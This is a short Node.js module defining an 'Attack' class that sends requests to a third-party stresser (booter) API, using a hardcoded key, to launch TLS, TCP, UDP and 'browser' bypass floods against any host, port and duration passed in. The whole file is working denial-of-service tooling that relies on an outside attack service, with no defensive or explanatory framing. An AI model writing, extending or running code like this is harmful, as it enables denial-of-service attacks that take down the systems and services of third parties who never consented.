const { all, get } = require("axios");

class Attack {
    static async send(host, port, time, method) {
        switch(method.toLowerCase()) {
            // Layer 4 - 7
            case "tls":
                all([
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=TLS`)
                ]);
                break;
                break;
            case "tcp":
                all([
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=TCP`)
                ]);
                break;
            //
            case "udp":
                all([
                    get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=UDP`)
                ]);
                break;
             // Bypasses
            case "browser":
                all([
					get(`http://api.humanitystresser.lol/api?key=quartzkey34&host=${host}&port=${port}&time=${time}&method=BROWSER`)
                ]);
            }
        }
    }
    
module.exports = Attack;